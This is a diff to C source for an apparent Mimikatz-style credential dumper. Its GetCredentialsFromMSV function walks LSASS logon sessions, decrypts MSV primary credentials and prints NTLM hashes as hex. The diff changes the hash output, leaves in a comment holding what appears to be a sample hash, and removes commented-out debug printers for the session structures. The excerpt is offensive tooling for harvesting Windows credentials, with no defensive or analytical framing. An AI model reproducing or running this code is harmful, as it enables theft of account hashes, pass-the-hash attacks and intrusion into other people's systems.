@@ -267,90 +267,23 @@ VOID GetCredentialsFromMSV() {
 		}
 		else {
 			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(
-				(PUCHAR)(credentials.PrimaryCredentials) 
-				+ offsetof(KIWI_MSV1_0_PRIMARY_CREDENTIALS, Credentials)
+				(PUCHAR)(credentials.PrimaryCredentials) + offsetof(KIWI_MSV1_0_PRIMARY_CREDENTIALS, Credentials)
 				));
+			// HexdumpBytesPacked((PBYTE)password->Buffer+0x4A, 16);
 			wprintf(L"NTLMHash: ");
 			if (DecryptCredentials((char*)(password->Buffer), password->MaximumLength,
 				(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
-				wprintf(L"%ls\n\n", passDecrypted);
+				// HexdumpBytesPacked((PBYTE)passDecrypted, sizeof passDecrypted);
+				HexdumpBytesPacked((PBYTE)passDecrypted+0x4A, 16);
+				wprintf(L"\n");
+				// wprintf(L"%ls\n\n", passDecrypted);
+				// bb 4c b5 54 c0 12 92 2f c3 59 23 44 28 7d 8d 31 3b 6e 5b f6
 			}
 			else {
 				wprintf(L"\n\n");
 			}
 		}
-
+		
 		pList = listEntry.Flink;
 	} while (pList != logSessListAddr);
 }
-/*
-// ´òÓ¡¸¨Öúº¯Êý
-void printLsaUnicodeString(const LSA_UNICODE_STRING& str, const char* label) {
-	printf("%s: Length = %u, MaximumLength = %u, Buffer = %ws\n",
-		label, str.Length, str.MaximumLength,
-		str.Buffer ? str.Buffer : L"(null)");
-}
-
-void printLuid(const LUID& luid, const char* label) {
-	printf("%s: LowPart = %lu, HighPart = %ld\n", label, luid.LowPart, luid.HighPart);
-}
-
-void printStruct(const KIWI_MSV1_0_LIST_63& s) {
-	printf("Flink: %p\n", s.Flink);
-	printf("Blink: %p\n", s.Blink);
-	printf("unk0: %p\n", s.unk0);
-	printf("unk1: %lu\n", s.unk1);
-	printf("unk2: %p\n", s.unk2);
-	printf("unk3: %lu\n", s.unk3);
-	printf("unk4: %lu\n", s.unk4);
-	printf("unk5: %lu\n", s.unk5);
-	printf("hSemaphore6: %p\n", s.hSemaphore6);
-	printf("unk7: %p\n", s.unk7);
-	printf("hSemaphore8: %p\n", s.hSemaphore8);
-	printf("unk9: %p\n", s.unk9);
-	printf("unk10: %p\n", s.unk10);
-	printf("unk11: %lu\n", s.unk11);
-	printf("unk12: %lu\n", s.unk12);
-	printf("unk13: %p\n", s.unk13);
-
-	printLuid(s.LocallyUniqueIdentifier, "LocallyUniqueIdentifier");
-	printLuid(s.SecondaryLocallyUniqueIdentifier, "SecondaryLocallyUniqueIdentifier");
-
-	printf("waza: ");
-	for (int i = 0; i < 12; i++) {
-		printf("%02X ", s.waza[i]);
-	}
-	printf("\n");
-
-	printLsaUnicodeString(s.UserName, "UserName");
-	printLsaUnicodeString(s.Domaine, "Domaine");
-
-	printf("unk14: %p\n", s.unk14);
-	printf("unk15: %p\n", s.unk15);
-
-	printLsaUnicodeString(s.Type, "Type");
-
-	printf("pSid: %p\n", s.pSid);
-	printf("LogonType: %lu\n", s.LogonType);
-	printf("unk18: %p\n", s.unk18);
-	printf("Session: %lu\n", s.Session);
-	printf("LogonTime: %lld\n", s.LogonTime.QuadPart);
-
-	printLsaUnicodeString(s.LogonServer, "LogonServer");
-
-	printf("Credentials: %p\n", s.Credentials);
-	printf("unk19: %p\n", s.unk19);
-	printf("unk20: %p\n", s.unk20);
-	printf("unk21: %p\n", s.unk21);
-	printf("unk22: %lu\n", s.unk22);
-	printf("unk23: %lu\n", s.unk23);
-	printf("unk24: %lu\n", s.unk24);
-	printf("unk25: %lu\n", s.unk25);
-	printf("unk26: %lu\n", s.unk26);
-	printf("unk27: %p\n", s.unk27);
-	printf("unk28: %p\n", s.unk28);
-	printf("unk29: %p\n", s.unk29);
-	printf("CredentialManager: %p\n", s.CredentialManager);
-}
-
-*/
